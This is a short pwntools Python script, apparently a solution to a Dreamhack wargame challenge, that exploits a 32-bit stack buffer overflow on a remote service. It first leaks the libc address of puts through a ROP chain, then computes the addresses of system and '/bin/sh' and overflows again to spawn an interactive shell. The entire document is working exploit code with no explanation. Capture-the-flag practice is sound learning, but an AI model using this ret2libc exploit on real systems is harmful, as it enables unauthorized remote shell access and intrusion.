from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host8.dreamhack.games', 12457
r = remote(HOST, PORT)

main = 0x80485d9
puts_plt = 0x8048420
puts_got = 0x804a018

r.sendline(b'A' * 0x48 + p32(puts_plt) + p32(main) + p32(puts_got))

libc_puts = u32(r.recvline().strip(b'A').strip()[:4])
libc = libc_puts - 0x72830
binsh = libc + 0x1b90f5
system = libc + 0x47cb0

r.sendline(b'A' * 0x48 + p32(system) + p32(0) + p32(binsh))

r.interactive()